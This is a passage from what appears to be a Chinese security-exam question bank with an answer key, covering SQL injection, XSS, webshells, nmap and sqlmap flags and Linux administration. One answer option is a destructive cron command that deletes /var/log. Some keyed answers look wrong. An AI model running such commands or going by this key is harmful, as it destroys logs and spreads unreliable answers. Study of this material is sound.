<strong>D</strong></p><p>A.asp<br>B.asa<br>C.cer<br>D.cep</p><hr><p>16·哪个键唯一地标识表组 <strong>C</strong></p><p>A.外键<br>B.本地键<br>C.主键<br>D.超键</p><hr><p>17·如下设置，哪个可能造成宽字符注入 <strong>D</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">A.<span class="hljs-built_in">set</span> <span class="hljs-attribute">character_set_connection</span>=<span class="hljs-string">&#x27;gbk&#x27;</span><br>B.<span class="hljs-built_in">set</span> <span class="hljs-attribute">character_set_connection</span>=<span class="hljs-string">&#x27;binary&#x27;</span><br>C.<span class="hljs-built_in">set</span> <span class="hljs-attribute">character_set_result</span>=<span class="hljs-string">&#x27;gbk&#x27;</span>,<br>D.<span class="hljs-built_in">set</span> <span class="hljs-attribute">charcter_set_client</span>=<span class="hljs-string">&#x27;gbk&#x27;</span><br></code></pre></td></tr></table></figure><hr><p>18·关于” WannaCry “勒索病毒软件描述正确的是 <strong>B</strong></p><p>A.利用RDP协议漏洞传播<br>B.利用SMB协议漏洞传播<br>C.利用HTTP协议漏洞传播<br>D.利用FTP协议传播</p><hr><p>19·若需要修改TOMCAT的监听地址，应修改哪个配置文件 <strong>B</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">A.tomcat.<span class="hljs-keyword">xml</span><br><span class="hljs-title">B</span>.server.<span class="hljs-keyword">xml</span><br><span class="hljs-title">C</span>.web.<span class="hljs-keyword">xml</span><br><span class="hljs-title">D</span>.tomcat-users.xml<br></code></pre></td></tr></table></figure><hr><p>20·用于查看&#x2F;var&#x2F;log&#x2F;wtmp日志的命令是 <strong>A</strong></p><p>A.last<br>B.lastlog<br>C.lastwtmp<br>D.lastmp</p><blockquote><p>lastlog默认是读取&#x2F;var&#x2F;log&#x2F;lastlog文件内容</p></blockquote><hr><h3 id="选择题-7"><a href="#选择题-7" class="headerlink" title="选择题 7"></a>选择题 7</h3><p>1·关于Windows系统的日志审核功能，错误的说法是 <strong>D</strong></p><p>A.如果启用进程审核，一般会产生大量的审核日志<br>B.启用”审核对象访问”，可以用来检测对重要文件或目录的访问<br>C.如果启用了’无法记录安全审核则立即关闭系统’这条安全策略，有可能对正常的生产业务产生影响<br>D.日志文件可以用事件查看器或者记事本来直接查看</p><hr><p>2·下面关于CSRF漏洞的防御方法不正确的是 <strong>D</strong></p><p>A.验证Referer<br>B.添加token验证<br>C.增加验证码<br>D.更换浏览器</p><hr><p>3·关于XSS漏洞分类说法错误的是 <strong>C</strong></p><p>A.存储型XSS<br>B.反射型XSS<br>C.扩展性XSS<br>D.DOM型XSS</p><hr><p>4·下面关于SUID权限的描述错误的是 <strong>A</strong></p><p>A.SUID权限仅对任意文件有效<br>B.执行者对于该文件具有x的权限<br>C.本权限仅在执行该文件的过程中有效<br>D.执行者将具有该文件拥有者的权限</p><hr><p>5·利用上面请求方法可以在HTTP响应头信息中，allow允许哪种请求方式 <strong>C</strong></p><p>A.GET<br>B.POST<br>C.OPTIONS<br>D.以上都是</p><hr><p>6·关于session的说法不正确的是 <strong>D</strong></p><p>A.Session 对象可以存储特定用户会话所需的属性及配置信息<br>B.Session 对象最常见的是存储用户的首选项<br>C.如果用户没有会话，则 Web 服务器将自动创建一个 Session 对象<br>D.session id存储在服务器中</p><hr><p>7·属于第二层的VPN隧道协议有 <strong>A</strong></p><p>A.PPTP<br>B.IPSec<br>C.GRE<br>D.以上都不是</p><hr><p>8·RSA算法基于的数学难题时 <strong>B</strong></p><p>A.椭圆曲线问题<br>B.大质数分解的困难性<br>C.费马大定理<br>D.离散对数问题</p><hr><p>9·当web服务器访问人数超过了设计访问人数上限，将可能出现的HTTP状态码是 <strong>A</strong> </p><p>A.503<br>B.302<br>C.403<br>D.200</p><hr><p>10·计算机网络通信时，利用 <strong>A</strong> 协议获得对方的MAC地址</p><p>A.ARP<br>B.RARP<br>C.UDP<br>D.TCP</p><hr><p>11·Hash函数的输入长度是 <strong>B</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">A</span>.<span class="hljs-number">160</span>bit<br><span class="hljs-attribute">B</span>.任意长度<br><span class="hljs-attribute">C</span>.<span class="hljs-number">128</span>bit<br><span class="hljs-attribute">D</span>.<span class="hljs-number">512</span>bit<br></code></pre></td></tr></table></figure><hr><p>12·高层的协议将数据传递到网络层，形成 <strong>D</strong>，然后传递到数据链路层 </p><p>A.数据段<br>B.信元<br>C.数据帧<br>D.数据包</p><p><img src="/dong.github/%E9%80%89%E6%8B%A9+%E7%BB%BC%E5%90%88.assets/image-20210219183854183.png" alt="image-20210219183854183"></p><hr><p>13·UNIX中，可以使用下面哪一个代替Telnet，能完成同样的事情并且更安全 <strong>A</strong></p><p>A.SSH<br>B.RHOST<br>C.RLOGON<br>D.FTP</p><hr><p>14·设置IP地址MAC绑定的目的 <strong>B</strong></p><p>A.防止DOS攻击<br>B.防止非法接入<br>C.加强认证<br>D.防止泄漏网络拓扑</p><hr><p>15·在拿到一个windows服务器下的webshell之后，我想看看当前在线的用户，下面这些命令可以做到的是 <strong>A</strong> </p><p>A.query user<br>B.dir c:\users<br>C.tasklist &#x2F;v<br>D.net user</p><hr><p>16·以下哪项可以修复命令执行漏洞 <strong>B</strong></p><p>A.网站使用世界上最好的PHP语言编写<br>B.php中禁用一些危险函数<br>C.调用iconv()函数进行转码<br>D.参数值尽量不使用引号包裹</p><hr><p>17·我们在使用nmap时，如果已经知道被扫描主机(192.168.20.20)是存活的，我们可以使用下列哪个命令直接跳过主机发现 <strong>A</strong></p><p>A.nmap -Pn 192.168.20.20<br>B.nmap -Ps 192.168.20.20<br>C.nmap -PA 192.168.20.20<br>D.nmap -PS 192.168.20.20</p><blockquote><p>-Pn   非PING模式</p></blockquote><hr><p>18·PHP 提供以下哪个函数来避免SQL注入 <strong>C</strong></p><p>A.htmlentities<br>B.escapeshellarg<br>C.mysql_real_escape_string<br>D.escapeshellcmd</p><blockquote><p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><p>htmlentities — 将字符转换为 HTML 转义字符</p><p>escapeshellcmd — shell 元字符转义</p><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul></blockquote><p>19·sqlmap注入进行SQL注入时我们会使用什么命令去爆所有的库名 <strong>C</strong></p><p>A columns<br>B current-db<br>C dbs<br>D tables</p><hr><p>20·关于IIS短文件名漏洞描述错误的是 <strong>D</strong></p><p>A 对象转换成字节流，便于保存在内存中<br>B 只猜解前6位，以及扩展名前三位<br>C 需要IIS和.net都满足<br>D 名称较短的文件是没有相应的短文件名的</p><hr><h3 id="选择题-8"><a href="#选择题-8" class="headerlink" title="选择题 8"></a>选择题 8</h3><p>1·使用nmap扫描 FIN扫描，圣诞树扫描，空扫描的命令 <strong>D</strong></p><p>A.-sO,-sX,-sN<br>B.-sF,-sX,-sP<br>C.-sS,-sX,-sN<br>D.-sF,-sX,-sN</p><hr><p>2·linux什么命令可以控制口令的存活 <strong>B</strong></p><p>A.passwd<br>B.change<br>C.chmod<br>D.umask</p><hr><p>3·用户在使用telnet或者FTP链接到远程主机上时在网上是没有加密的，方法就是通过监视携带用户名和口令的<strong>D</strong>包获取用户信息</p><p>A.UDP<br>B.icmp<br>C.TCP<br>D.IP</p><hr><p>4·通过什么命令可以为违建添加系统、隐藏等属性 <strong>D</strong></p><p>A.format<br>B.assoc<br>C.cmd<br>D.attrib</p><blockquote><p>Attrib更改单个文件或bai目录的属性。+r 设置只读属du性、zhi-r 清除只读属性、-s 清除系统属性、-h 清除隐藏属性。 </p></blockquote><hr><p>5·下面对cookie和session描述不正确的是 <strong>C</strong></p><p>A.COOKIE在客户端，session在服务器内<br>B.cookie支持跨域访问，session仅对他所在的域名有效<br>C.对于验证平台cookie比session更安全<br>D.session存储的数据类型比COOKIE多</p><p><strong>C</strong></p><hr><p>6·HTTP1.1那种请求方式未被定义 <strong>B</strong></p><p>A.TARCE<br>B.PUSH<br>C.CONNECT<br>D.DELETE</p><hr><p>7·MySQL那个函数能读取文件 <strong>D</strong></p><p>A.extract_file()<br>B.file_scan()<br>C.dump_file()<br>D.load_file()</p><hr><p>8·namp SYN扫描参数 <strong>C</strong></p><p>A.-sP<br>B.-sT<br>C.-sS<br>D.-sU</p><hr><p>9·DNS查询方式有很多种以下那个方式可以通过IP查询域名 <strong>C</strong></p><p>A.递归<br>B.正向<br>C.反向<br>D.迭代</p><blockquote><p>查询DNS的客户端叫resolver，resolver查询某一个DNS 服务器。服务器返回结果，可能有记录，也可能没有。但是不管如何，DNS查询结束</p><p>递归查询：客户机向dns服务器发送请求，DNS服务器会使用一个准确的查询结果回复给客户机，如果DNS服务器本地没有储存查询的DNS信息，那么它会查询其他的DNS服务器，并将查询结果提交给客户机</p><p>迭代查询：客户机向dns服务器发送请求，如果该服务器本地没有储存查询的DNS信息，那么它会告诉客户机另一台DNS服务器的地址，客户机在向这台DNS服务器查询DNS信息，依次循环直到返回结果</p></blockquote><hr><p>10·下面linux权限对应错误的是 <strong>A</strong></p><p>A.rwx-r–r–   622<br>B.r-xr-xr-x    555<br>C.rwxr-xr-x    755<br>D.rwx—-w-    702</p><hr><p>11·serv-u 提权后的权限 <strong>D</strong></p><p>A.ROOT<br>B.GUEST<br>C.ADMIN<br>D.SYSTEM</p><hr><p>12·哪些措施可以保护个人信息 <strong>A</strong></p><p>A.定期修改密码或采用强密码<br>B.从不清理系统日志或各种软件使用痕迹<br>C.随意连接wifi<br>D.使用记住密码</p><hr><p>13·Burp Suite 是用于攻击<strong>A</strong>的集成平台。</p><p>A.web 应用程序<br>B.客户机<br>C.服务器<br>D.浏览器</p><hr><p>14·使用nmap进行ping扫描时使用的参数 <strong>A</strong></p><p>A.-sP<br>B.-p<br>C.-p0<br>D.-A</p><hr><p>15·nmap的-sV是什么操作 <strong>C</strong></p><p>A.TCP全连接扫描<br>B.FIN扫描<br>C.版本扫描<br>D.全面扫描</p><hr><p>16·在HTTP 状态码中表示重定向的是 <strong>B</strong></p><p>A.200<br>B.302<br>C.403<br>D.500</p><hr><p>17·以下哪个是常用WEB漏洞扫描工具 <strong>A</strong></p><p>A.Acunetix WVS<br>B.hydra<br>C.中国菜刀<br>D.NMAP</p><hr><p>18·扫描器之王NMAP中，全面扫描的命令是什么 <strong>D</strong></p><p>A.-O<br>B.-sV<br>C.-sP<br>D.-A</p><hr><p>19·Hydra 工具中的 -L 参数的含义是 <strong>D</strong></p><p>A.指定单个密码<br>B.指定一个密码字典<br>C.指定一个用户名<br>D.指定一个用户名字典</p><hr><p>20·在远程管理Linux服务器时，以下<strong>C</strong>方式采用加密的数据传输。</p><p>A.rsh<br>B.telnet<br>C.ssh<br>D.rlogin</p><hr><h2 id="新题目"><a href="#新题目" class="headerlink" title="新题目"></a>新题目</h2><h3 id="选择题-9"><a href="#选择题-9" class="headerlink" title="选择题 9"></a>选择题 9</h3><p>1·哪一项不是命令执行漏洞的危害 <strong>C</strong></p><p>A.继承WEB服务程序的权限，读写文件</p><p>B.反弹SHELL </p><p>C.对服务器造成大流量攻击 </p><p>D.控制整个网站</p><hr><p>2·下列那个选项不是上传功能常用安全监测机制 <strong>A</strong></p><p>A.URL中是否包含一些特殊标签 </p><p>B.服务端文件扩展名检查验证机制 </p><p>C.客户端检查机制JavaScript验证 </p><p>D.服务的MIME检查验证</p><hr><p>3.防火墙最主要被部署在<strong>D</strong>位置</p><p>A.桌面终端 </p><p>B.重要服务器 </p><p>C.骨干线路 </p><p>D.网络边界</p><hr><p>4.一个网站存在命令执行漏洞，由于服务器不能连外网，这时我们可以利用<strong>A</strong>方式将文件上传到服务器 （1分） </p><p>A.echo </p><p>B.FTP </p><p>C.PowerShell </p><p>D.vbs </p><hr><p>5.文件包含中伪协议 使用<strong>A</strong>进行写入一句话木马</p><p>A.php:&#x2F;&#x2F;input </p><p>B.http:&#x2F;&#x2F; </p><p>C.phar:&#x2F;&#x2F; </p><p>D.php:&#x2F;&#x2F;filter </p><hr><p>6.口令机制通常用于<strong>D</strong></p><p>A.标识 </p><p>B.注册 </p><p>C.授权 </p><p>D.认证 </p><hr><p>7.拒绝服务不包括以下哪一项<strong>A</strong></p><p>A.ARP攻击 </p><p>B.畸形报文攻击 </p><p>C.DDoS </p><p>D.Land攻击</p><hr><p>8.SQL注入中 &#x3D; 被过滤可以使用<strong>D</strong>来代替</p><p>A.&amp; </p><p>B.VS </p><p>C.AND </p><p>D.LIKE </p><hr><p>9.（<strong>D</strong>）是最常用的公钥密码算法</p><p>A.量子密码 </p><p>B.椭圆曲线 </p><p>C.DSA </p><p>D.RSA</p><hr><p>10.（<strong>A</strong>）属于Web中使用的安全协议</p><p>A.SSL、S-HTTP </p><p>B.PEM、SSL </p><p>C.S-HTTP、S&#x2F;MIME </p><p>D.S&#x2F;MIME、SSL</p><hr><p>11.PHP提供以下哪些函数来避免SQL注入 <strong>C</strong> </p><p>A.htmlspecialchars </p><p>B.htmlentities </p><p>C.mysql_real_escape_string</p><p>D.escapeshellarg</p><hr><p>12.用户收到了一封可疑的电子邮件，要求用户提供银行账户及密码，这是属于何种攻击手段<strong>D</strong> </p><p>A.暗门攻击 </p><p>B.缓冲区溢出攻击 </p><p>C.DDos攻击 </p><p>D.钓鱼攻击 </p><hr><p>13.以下哪项不是绕过XSS过滤的办法<strong>D</strong></p><p>A.利用HTML标签的属性值 </p><p>B.利用单引号双引号 </p><p>C.扰乱过滤规则 </p><p>D.利用空字符</p><hr><p>14.存储型XSS一般会出现在网站的哪个位置<strong>B</strong></p><p>A.登陆框 </p><p>B.网站的留言板 </p><p>C.URL位置 </p><p>D.搜索栏</p><hr><p>15.以下哪项不属于针对数据库的攻击 <strong>B</strong></p><p>A.特权提升 </p><p>B.利用XSS漏洞攻击 </p><p>C.SQL注入 </p><p>D.强力破解弱口令或默认的用户名及口令 </p><hr><p>16.Unix系统中存放每个用户信息的文件是 <strong>D</strong></p><p>A.&#x2F;sys&#x2F;password </p><p>B.&#x2F;sys&#x2F;passwd </p><p>C.&#x2F;etc&#x2F;password </p><p>D.&#x2F;etc&#x2F;passwd </p><hr><p>17.SQL Sever中可以使用哪个存储过程调用操作系统命令，添加系统账号<strong>B</strong></p><p>A.xp_dirtree </p><p>B.xp_cmdshell </p><p>C.xp_shell </p><p>D.xpdeletekey</p><hr><p>18.以下哪种方法不能找到CDN的网站的真实IP<strong>B</strong></p><p>A.利用SSL证书寻找真实IP </p><p>B.使用Wireshark对本地网络请求进行抓包分析 </p><p>C.使用世界各地服务器对域名进行PING检测 </p><p>D.查询历史DNS记录</p><hr><p>19.PHP CGI解析漏洞出现的原因是<strong>A</strong></p><p>A.cgi.fix_pathinfo配置错误 </p><p>B.phpinfo配置错误 </p><p>C.cgi.fix_pathi配置错误 </p><p>D.cgi.fix__status_en配置错误 </p><p>20.Man-in-the-middle攻击，简称MITM，即<strong>D</strong></p><p>A.后门漏洞攻击 </p><p>B.拒绝服务攻击 </p><p>C.重放攻击 </p><p>D.中间人攻击 </p><hr><h3 id="选择题-10"><a href="#选择题-10" class="headerlink" title="选择题 10"></a>选择题 10</h3><p>1·在使用sqlmap时，下面那个参数可以指定数据库名称<strong>B</strong></p><p>A.-u </p><p>B.-D </p><p>C.-T </p><p>D.-C</p><hr><p>2·SQL注入空格被过滤的话，哪些字符不可以替代<strong>D</strong></p><p>A.%0A </p><p>B.%09 </p><p>C.%0B </p><p>D.%0e</p><hr><p>3·为了确保MYsql不存在弱口令，执行一下什么命令可以查看 <strong>A</strong></p><p>A.select user,password from .user</p><p>B.select mysql.password from admin.user</p><p>C.select admin,password from mysql.user</p><p>D.select password from admin.user</p><hr><p>4·Shell提示符<strong>C</strong>代表最高权限用户</p><p>A.@ </p><p>B.% </p><p>C.# </p><p>D.$ </p><hr><p>5·关于Telnet描述不正确是<strong>D</strong></p><p>A.telnet是远程登录系统进行管理的程序 </p><p>B.缺省的情况下可以使用23端口</p><p>C.可以利用telnet客户端程序连接到其他端口，如80端口</p><p>D.telnet多用于unix和linux系统，一般不用于windows系统中</p><hr><p>6·ASPX的网站配置文件一般存放在哪个文件<strong>C</strong></p><p>A.Conn.asp  </p><p>B.config.php </p><p>C.web.config </p><p>D.index.aspx</p><hr><p>7·下列那个选项不属于PHP伪协议<strong>C</strong></p><p>A.file:&#x2F;&#x2F; </p><p>B.zilb:&#x2F;&#x2F; </p><p>C.fdp:&#x2F;&#x2F; </p><p>D.phar:&#x2F;&#x2F;</p><hr><p>8·文件包含中%00截断，对PHP版本有什么要求 <strong>D</strong></p><p>A.PHP版本&gt;5.5.4 </p><p>B.PHP版本&lt;5.5.4 </p><p>C.PHP版本&lt;5.1.4   </p><p>D.PHP版本&lt;5.3.4</p><hr><p>9·PHP文件包含的函数中，符合只要程序一运行就包含文件，找不到文件时会产生致命错误，并停止脚本的函数是 <strong>A</strong></p><p>A.require</p><p>B.include </p><p>C.fopen   </p><p>D.include_once()</p><hr><p>10·在SQL注入中，哪种类型的注入不需要闭合字符 <strong>B</strong></p><p>A.单引号注入  </p><p>B.整形注入  </p><p>C.双引号注入  </p><p>D.都有可能</p><hr><p>11·TCP协议三次握手的第一步是发送一个 <strong>A</strong></p><p>A.SYN包  </p><p>B.ACK包  </p><p>C.UDP包  </p><p>D.NULL包</p><hr><p>12·以下那些攻击手段是基于应用层的攻击方式 <strong>A</strong></p><p>A.BGP劫持  </p><p>B.ARP攻击  </p><p>C.sniffer嗅探  </p><p>D.MAC泛洪</p><hr><p>13·信息系统漏洞主要是包括WEB方面的漏洞，操作系统漏洞，数据库漏洞三类。一下不属于WEB方面漏洞的选项是 <strong>D</strong></p><p>A.XML外部实体注入攻击 </p><p>B.反序列化漏洞  </p><p>C.任意文件读取漏洞  </p><p>D.UAC保护绕过漏洞</p><hr><p>14·在LINUX系统中，日志一般存放在&#x2F;var&#x2F;log&#x2F;下，以下那个日志可以实现记录系统启动后的信息和错误的日志。<strong>A</strong></p><p>A.&#x2F;var&#x2F;log&#x2F;messages </p><p>B.&#x2F;var&#x2F;log&#x2F;wtmp</p><p>C.&#x2F;var&#x2F;log&#x2F;faillog  </p><p>D.&#x2F;var&#x2F;log&#x2F;secure</p><hr><p>15·在LINUX系统中,以下那个文件可以查看当前系统中账户的密码信息 <strong>A</strong></p><p>A.&#x2F;etc&#x2F;shadow </p><p>B.&#x2F;etc&#x2F;sudoers</p><p>C.&#x2F;etc&#x2F;login.defs  </p><p>D.&#x2F;etc&#x2F;passwd</p><hr><p>16·MS17-010是永恒之蓝漏洞，该漏洞自2017年被曝光之后，wannacry勒索病毒利用此漏洞迅速感染蔓延。wannacry勒索病毒肆虐。俨然是一场全球性的互联网灾难，给广大电脑用户造成了巨大损失。MS17-010漏洞是利用一下那个网络协议进行攻击的呢 <strong>B</strong></p><p>A.PAP协议 </p><p>B.SMB协议</p><p>C.NFS协议  </p><p>D.PPP协议</p><hr><p>17·在Linux配置中计划任务时，以下哪个选项可以实现每隔5天的23点清空一次&#x2F;var&#x2F;log&#x2F;的数据。<strong>D</strong></p><p>A.<code>*/5 23 * * * /usr/bin/rm -rf/var/log/*</code></p><p>B.<code>5 23 * * /usr/bin/rm -rf/var/log/*</code></p><p>C.<code>* * 5 0 23 /usr/bin/rm -rf/var/log/</code></p><p>D.<code> 0 23 */5 * * /usr/bin/rm -rf/var/log/*</code></p><hr><p>18·以下关于“水坑攻击“的攻击手段说法错误的是 <strong>B</strong></p><p>A.入侵与目标相关的web站点  </p><p>B.发送恶意邮件</p><p>C.替换正常文件</p><p>D.篡改正常链接</p><hr><p>19·以下关于“鱼叉攻击”的攻击手段说法错误的是<strong>B</strong></p><p>A.有针对性地挑选目标机构</p><p>B.扫描目标网站漏洞</p><p>C.收集目标机构人员的邮箱信息</p><p>D.向目标邮箱中投递恶意邮件</p><hr><p>20· IOC的意思是<strong>D</strong></p><p>A.机读威胁情报</p><p>B.文件信誉情报</p><p>C.IP信誉情报</p><p>D.失陷检测情报</p><hr><h3 id="选择题-11"><a href="#选择题-11" class="headerlink" title="选择题 11"></a>选择题 11</h3><p>1、<strong>C</strong>是最常用的公钥密码算法</p><p>A 量子密码</p><p>B DSA</p><p>C RSA</p><p>D 椭圆曲线</p><hr><p>2、通过修改HTTP Headers 中的哪个键值可以伪造来源网址 <strong>C</strong></p><p>A User-Agent</p><p>B Accept</p><p>C Referer</p><p>D X-Forwarded-For</p><hr><p>3、在使用Sqlmap进行SQL注入时，我们会使用什么参数来爆所有的数据库名 <strong>A</strong></p><p>A dbs</p><p>B tables</p><p>C columns</p><p>D current-db</p><hr><p>4、SQL Sever中可以使用哪个存储过程调用操作系统命令，添加系统账号 <strong>B</strong></p><p>A xpdeletekey</p><p>B xp_cmdshell</p><p>C xp_shell</p><p>D xp_dirtree</p><hr><p>5、下列哪个方法不是HTTP协议的请求方法 <strong>A</strong></p><p>A SELECT</p><p>B HEAD</p><p>C OPTIONS</p><p>D PUT</p><hr><p>6、Metasploit Framework中，可以使用（）来枚举本地局域网中的所有活跃主机 <strong>B</strong></p><p>A dir_scanner</p><p>B arp_sweep</p><p>C empty_udp</p><p>D arp_neighbo</p><hr><p>7、哪一项不是命令执行漏洞的危害 <strong>B</strong></p><p>A 继承WEB服务程序的权限，读写文件</p><p>B 对服务器造成大流量攻击</p><p>C 控制整个网站</p><p>D 反弹SHELL</p><hr><p>8、永恒之蓝漏洞利用以下哪个端口 <strong>D</strong></p><p>A 3306</p><p>B 21</p><p>C 3389</p><p>D 445</p><hr><p>9、MSSQL的默认端口是 <strong>B</strong></p><p>A 1521</p><p>B 1433</p><p>C 3306</p><p>D 3389</p><hr><p>10、下列 <strong>B</strong> 不是常见系统命令函数</p><p>A shell_exec()</p><p>B assert()</p><p>C system()</p><p>D exec()</p><hr><p>11、Unix系统中存放每个用户信息的文件是 <strong>D</strong></p><p>A &#x2F;sys&#x2F;passwd</p><p>B &#x2F;sys&#x2F;password</p><p>C &#x2F;etc&#x2F;password</p><p>D &#x2F;etc&#x2F;passwd</p><hr><p>12、Hydra工具中的-L参数的含义是 <strong>B</strong></p><p>A 指定单个密码</p><p>B 指定一个用户名字典</p><p>C 指定一个密码字典</p><p>D 指定一个用户名</p><hr><p>13、关于命令执行漏洞的利用描述错误的是 <strong>B</strong></p><p>A System函数可以用来执行一个外部的应用程序，并将相应的执行结果输出</p><p>B Eval函数会将参数字符串作为系统程序代码来执行</p><p>C Exec函数可以用来执行一个外部的应用程序</p><p>D Shell_exec：执行shell命令并返回输出的字符串</p><hr><p>14、XXE漏洞可以做什么 <strong>B</strong></p><p>A 网络钓鱼</p><p>B 读取服务器文件</p><p>C 盗取用户Cookie</p><p>D 获取用户浏览器信息</p><hr><p>15、PHP提供以下哪些函数来避免SQL注入 <strong>B</strong></p><p>A htmlentities</p><p>B mysql_real_escape_string</p><p>C escapeshellarg</p><p>D htmlspecialchars</p><hr><p>16、当成功通过msf黑进对方系统并获得system权限后，不能做什么操作 <strong>A</strong></p><p>A 开关机</p><p>B 屏幕截图</p><p>C 读写文件</p><p>D 键盘记录</p><hr><p>17、下列那个选项不是上传功能常用安全监测机制 <strong>A</strong></p><p>A URL中是否包含一些特殊标签</p><p>B 服务端文件扩展名检查验证机制</p><p>C 客户端检查机制JavaScript验证</p><p>D 服务的MIME检查验证</p><hr><p>18、拒绝服务不包括以下哪一项 <strong>C</strong></p><p>A DDoS</p><p>B Land攻击</p><p>C ARP攻击</p><p>D 畸形报文攻击</p><hr><p>19、下列工具中可以对WEB表单进行暴力破解的是 <strong>C</strong></p><p>A Sqlmap</p><p>B Nmap</p><p>C BurpSuite</p><p>D Appscan</p><hr><p>20、RDP的端口号为 <strong>B</strong></p><p>A 443</p><p>B 3389</p><p>C 1433</p><p>D 3306</p><hr><h3 id="选择题-12"><a href="#选择题-12" class="headerlink" title="选择题 12"></a>选择题 12</h3><p>1、SQL注入时使用into uotfile进行写木马的操作，必须满足下列哪个选项最为准确 <strong>C</strong></p><p>A 必须知道网站的绝对路径</p><p>B 不需要条件，可以随便写</p><p>C 支持联合查询并且知道网站的绝对路径</p><p>D 支持联合查询</p><hr><p>2、<strong>D</strong>属于Web中使用的安全协议 </p><p>A PEM、SSL</p><p>B S&#x2F;MIME、SSL</p><p>C S-HTTP、S&#x2F;MIME</p><p>D SSL、S-HTTP</p><p>3、以下哪种方法不能找到CDN的网站的真实IP <strong>A</strong></p><p>A 使用Wireshark对本地网络请求进行抓包分析</p><p>B 利用SSL证书寻找真实IP</p><p>C 使用世界各地服务器对域名进行PING检测</p><p>D 查询历史DNS记录</p><hr><p>4、文件包含中伪协议 使用 <strong>D</strong>进行写入一句话木马</p><p>A php:&#x2F;&#x2F;filter</p><p>B http:&#x2F;&#x2F;</p><p>C phar:&#x2F;&#x2F;</p><p>D php:&#x2F;&#x2F;input</p><hr><p>5、在Linux系统中，一个文件的访问权限是755，其含义是什么 <strong>B</strong></p><p>A 可读</p><p>B 可读，可执行，可写入</p><p>C 可写入</p><p>D 可读，可执行</p><hr><p>6、Q0lTUC1QVEU&#x3D;此段密文采用了那种加密方式 <strong>D</strong></p><p>A DES</p><p>B AES</p><p>C MD5</p><p>D Base64</p><hr><p>7、ASPX的网站配置文件一般存放在哪个文件里 <strong>D</strong></p><p>A index.aspx</p><p>B config.php</p><p>C conn.asp</p><p>D web.config</p><hr><p>8、以下哪项不是绕过XSS过滤的办法 <strong>B</strong></p><p>A 利用单引号双引号</p><p>B 利用空字符</p><p>C 利用HTML标签的属性值</p><p>D 扰乱过滤规则</p><hr><p>9、对网络系统进行渗透测试，通常是按什么顺序来进行的 <strong>B</strong></p><p>A 侦查阶段、控制阶段、入侵阶段</p><p>B 侦查阶段、入侵阶段、控制阶段</p><p>C 控制阶段、侦查阶段、入侵阶段</p><p>D 入侵阶段、侦查阶段、控制阶段</p><hr><p>10、以下查看linux系统内核版本是 <strong>D</strong></p><p>A cat &#x2F;release -a</p><p>B cat &#x2F;etc&#x2F;passwd</p><p>C cat &#x2F;porc&#x2F;version</p><p>D uname –a</p><hr><p>11、存储型XSS一般会出现在网站的哪个位置 <strong>B</strong></p><p>A 搜索栏</p><p>B 网站的留言板</p><p>C URL位置</p><p>D 登陆框</p><hr><p>12、文件包含中%00截断，对PHP版本有什么要求 <strong>A</strong></p><p>A PHP版本&lt;5.3.4</p><p>B PHP版本&lt;5.5.4</p><p>C PHP版本&lt;5.1.4</p><p>D PHP版本&gt;5.5.4</p><hr><p>13、以下哪项不属于针对数据库的攻击 <strong>C</strong></p><p>A 特权提升</p><p>B SQL注入</p><p>C 利用XSS漏洞攻击</p><p>D 强力破解弱口令或默认的用户名及口令</p><hr><p>14、下列哪项不属于同源策略的要求 <strong>B</strong></p><p>A 同域名</p><p>B 同IP</p><p>C 同端口</p><p>D 同协议</p><hr><p>15、防火墙最主要被部署在 <strong>B</strong></p><p>A 骨干线路</p><p>B 网络边界</p><p>C 重要服务器</p><p>D 桌面终端</p><hr><p>16、一个网站存在命令执行漏洞，由于服务器不能连外网，这时我们可以利用（）方式将文件上到服务器 <strong>D</strong></p><p>A vbs</p><p>B FTP</p><p>C PowerShell</p><p>D echo</p><hr><p>17、SQL注入中 &#x3D; 被过滤可以使用 <strong>A</strong> 来代替</p><p>A LIKE</p><p>B VS</p><p>C &amp;</p><p>D AND</p><hr><p>18、口令机制通常用于 <strong>D</strong></p><p>A 标识</p><p>B 授权</p><p>C 注册</p><p>D 认证</p><hr><p>19、用户收到了一封可疑的电子邮件，要求用户提供银行账户及密码，这是属于何种攻击手段 <strong>B</strong></p><p>A 缓冲区溢出攻击</p><p>B 钓鱼攻击</p><p>C 暗门攻击</p><p>D DDos攻击</p><hr><p>20、CSRF攻击不能做什么 <strong>A</strong></p><p>A 盗取用户凭证</p><p>B 修改用户权限</p><p>C 删除用户信息</p><p>D 取消订单</p><hr><h3 id="选择题-13"><a href="#选择题-13" class="headerlink" title="选择题 13"></a>选择题 13</h3><ol><li><a href="https://so.csdn.net/so/search?q=RDP&spm=1001.2101.3001.7020">RDP</a>的端口号为<br>A. <code>3389</code><br>B. 23<br>C. 22<br>D. 443</li><li>Burp Suite 是用于攻击（）的集成平台。<br>A. <code>web 应用程序</code><br>B. 客户机<br>C. 服务器<br>D. 浏览器</li><li>使用<a href="https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020">nmap</a>进行ping扫描时使用的参数（）<br>A. <code>-sP</code><br>B. -p<br>C. -p0<br>D. -A</li><li>nmap的-sV是什么操作（）<br>A. TCP全连接扫描<br>B. FIN扫描<br>C. <code>版本扫描</code><br>D. 全面扫描</li><li>在HTTP 状态码中表示重定向的是（）<br>A. 200<br>B. <code>302</code><br>C. 403<br>D. 500</li><li>以下哪个是常用WEB漏洞扫描工具（）<br>A. <code>Acunetix WVS 14.0</code><br>B. hydra<br>C. 中国菜刀<br>D. NMAP</li><li>扫描器之王NMAP中，全面扫描的命令是什么（）<br>A. -O<br>B. -sV<br>C. -sP<br>D. <code>-A</code></li><li>Hydra 工具中的 -L 参数的含义是（）<br>A. 指定单个密码<br>B. 指定一个密码字典<br>C. 指定一个用户名<br>D. <code>指定一个用户名字典</code></li><li>在远程管理Linux服务器时，以下（ 